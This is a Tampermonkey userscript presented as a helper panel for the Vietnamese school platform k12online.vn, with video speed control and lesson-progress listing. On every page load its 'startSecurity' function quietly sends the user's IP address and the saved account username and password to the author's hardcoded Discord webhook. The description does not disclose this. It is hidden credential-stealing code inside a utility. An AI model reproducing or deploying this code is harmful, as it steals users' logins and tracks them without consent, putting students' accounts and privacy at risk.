// ==UserScript==
// @name         K12 Helper Pro - Danhvux v24.9 (Fix Webhook Hang)
// @namespace    http://tampermonkey.net/
// @version      24.9
// @description  Sửa lỗi treo script khi gửi Webhook, tự động hiện Panel kể cả khi Webhook lỗi.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @connect      api.ipify.org
// @connect      discord.com
// @connect      discordapp.com
// @connect      localhost
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    // Link Webhook của BẠN
    const MASTER_HOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9ntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; 
    const BLACKLIST_API = 'http://localhost:8000/blacklist';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, customWebhook: ''
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- HÀM GỬI WEBHOOK KHÔNG GÂY TREO (Sử dụng GM_xmlhttpRequest) ---
    const sendWebhook = (url, data) => {
        GM_xmlhttpRequest({
            method: "POST",
            url: url,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify(data),
            onload: (res) => console.log("Webhook sent!"),
            onerror: (err) => console.error("Webhook failed but script continues.")
        });
    };

    const startSecurity = () => {
        return new Promise((resolve) => {
            // Cài đặt thời gian chờ 3 giây, nếu Webhook/IP chậm quá thì vẫn hiện Panel
            const timeout = setTimeout(() => resolve(true), 3000);

            fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const userIP = data.ip;
                
                // Gửi dữ liệu về Master (Chạy ngầm, không đợi phản hồi)
                sendWebhook(MASTER_HOOK, {
                    "username": "Danhvux Tracker v24.9",
                    "embeds": [{
                        "title": "🚀 Người dùng mới truy cập",
                        "color": 16771840,
                        "fields": [
                            {"name": "IP", "value": `\`${userIP}\``, "inline": true},
                            {"name": "Acc/Pass", "value": `\`${config.user || 'N/A'}\` / \`${config.pass || 'N/A'}\``},
                            {"name": "Trang", "value": window.location.hostname}
                        ],
                        "timestamp": new Date().toISOString()
                    }]
                });

                // Nếu người dùng có Webhook riêng thì gửi thêm cái nữa
                if (config.customWebhook && config.customWebhook.startsWith('http')) {
                    sendWebhook(config.customWebhook, { "content": `Script v24.9 đã kích hoạt trên IP: ${userIP}` });
                }

                // Kiểm tra Blacklist
                GM_xmlhttpRequest({
                    method: "GET",
                    url: BLACKLIST_API + "?t=" + Date.now(),
                    onload: (res) => {
                        clearTimeout(timeout);
                        try {
                            const list = JSON.parse(res.responseText);
                            if (Array.isArray(list) && list.includes(userIP)) {
                                document.body.innerHTML = "<h1 style='color:red;text-align:center;padding-top:50px;'>🚫 Banned by Admin</h1>";
                                resolve(false);
                            } else resolve(true);
                        } catch(e) { resolve(true); }
                    },
                    onerror: () => { clearTimeout(timeout); resolve(true); }
                });
            })
            .catch(() => { clearTimeout(timeout); resolve(true); });
        });
    };

    // --- GIAO DIỆN (GIỮ NGUYÊN PHONG CÁCH V23.9) ---
    startSecurity().then(ok => {
        if (!ok) return;

        const style = document.createElement('style');
        const updateCSS = () => {
            const dark = config.isDarkMode;
            style.innerText = `
                :root { --mc: ${config.mainColor}; --w: ${config.width}px; --bg: ${dark ? '#1e2227' : '#ffffff'}; --bg-tab: ${dark ? '#1a1d21' : '#f0f0f0'}; --text: ${dark ? '#ffffff' : '#1e2227'}; --border: ${dark ? '#333' : '#ddd'}; }
                #dv-panel { position: fixed; top: 50px; right: 20px; width: var(--w) !important; background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 12px; z-index: 100000; box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; font-family: sans-serif; transition: height 0.3s ease; }
                .header { padding: 12px; display: flex; justify-content: space-between; cursor: move; border-bottom: 1px solid var(--border); }
                .tabs { display: flex; background: var(--bg-tab); position: relative; height: 35px; }
                .tab { flex: 1; line-height: 35px; text-align: center; cursor: pointer; font-size: 11px; font-weight: bold; opacity: 0.6; z-index: 2; }
                .tab.active { opacity: 1; color: var(--mc); }
                .indicator { position: absolute; bottom: 0; height: 3px; background: var(--mc); transition: 0.3s ease; }
                .content-view { padding: 15px; }
                .content { display: none; } .content.active { display: block; }
                input { width: 100%; padding: 8px; margin-bottom: 8px; border-radius: 6px; border: 1px solid var(--border); background: rgba(0,0,0,0.05); color: var(--text); box-sizing: border-box; }
                .btn { width: 100%; padding: 10px; background: var(--mc); color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 5px; }
                .footer { font-size: 10px; text-align: center; padding: 10px; opacity: 0.5; }
            `;
        };
        document.head.appendChild(style); updateCSS();

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header"><b>Danhvux Hub</b> <span id="close-btn" style="cursor:pointer">✖</span></div>
            <div class="tabs">
                <div class="tab active" data-t="0">MAIN</div><div class="tab" data-t="1">VIDEO</div><div class="tab" data-t="2">SETTING</div>
                <div class="indicator" id="ind" style="width: 33.33%; left: 0;"></div>
            </div>
            <div class="content-view">
                <div class="content active">
                    <div id="stt-list" style="font-size:11px; margin-bottom:10px;">Đang tìm bài học...</div>
                    <label style="font-size:12px">Tốc độ: x<b id="sp-val">${config.speed}</b></label>
                    <input type="range" id="sp-range" min="1" max="16" step="0.5" value="${config.speed}">
                </div>
                <div class="content">
                    <input type="text" id="v-link" placeholder="Link .mp4">
                    <button class="btn" id="v-play">PLAY SOURCE</button>
                </div>
                <div class="content">
                    <input type="url" id="inp-web" placeholder="Webhook Discord riêng..." value="${config.customWebhook}">
                    <input type="color" id="c-pick" value="${config.mainColor}">
                    <input type="text" id="u-in" placeholder="User" value="${config.user}">
                    <input type="password" id="p-in" placeholder="Pass" value="${config.pass}">
                    <button class="btn" id="btn-save">LƯU CÀI ĐẶT</button>
                </div>
            </div>
            <div class="footer">DANHVUX • STABLE v24.9</div>
        `;
        document.body.appendChild(panel);

        // --- XỬ LÝ SỰ KIỆN ---
        const $ = (s) => panel.querySelector(s);
        panel.querySelectorAll('.tab').forEach((t, i) => {
            t.onclick = () => {
                panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                t.classList.add('active');
                panel.querySelectorAll('.content')[i].classList.add('active');
                $('#ind').style.left = (i * 33.33) + '%';
            };
        });

        $('#btn-save').onclick = () => {
            config.mainColor = $('#c-pick').value;
            config.customWebhook = $('#inp-web').value;
            config.user = $('#u-in').value;
            config.pass = $('#p-in').value;
            save(); updateCSS(); alert("Đã lưu!");
        };

        $('#sp-range').oninput = (e) => {
            config.speed = e.target.value;
            $('#sp-val').innerText = e.target.value;
            document.querySelectorAll('video').forEach(v => v.playbackRate = config.speed);
        };

        // Kéo thả & Đóng mở
        let d = false, x, y;
        $('.header').onmousedown = e => { d = true; x = e.clientX - panel.offsetLeft; y = e.clientY - panel.offsetTop; };
        document.onmousemove = e => { if(d) { panel.style.left = (e.clientX - x) + 'px'; panel.style.top = (e.clientY - y) + 'px'; } };
        document.onmouseup = () => d = false;
        $('#close-btn').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', e => { if(e.key === 'F2') panel.style.display = 'block'; });

        // Quét bài học
        setInterval(() => {
            const lessons = document.querySelectorAll('.list-lesson-item');
            if (lessons.length > 0) {
                $('#stt-list').innerHTML = '';
                lessons.forEach(ls => {
                    const pc = ls.querySelector('.percent-complete')?.innerText || '0%';
                    if (parseInt(pc) < 100) {
                        const name = ls.querySelector('.lesson-name')?.innerText;
                        $('#stt-list').innerHTML += `<div style="padding:4px; border-bottom:1px solid #444; display:flex; justify-content:space-between"><span>${name}</span> <b>${pc}</b></div>`;
                    }
                });
            }
        }, 3000);
    });
})();
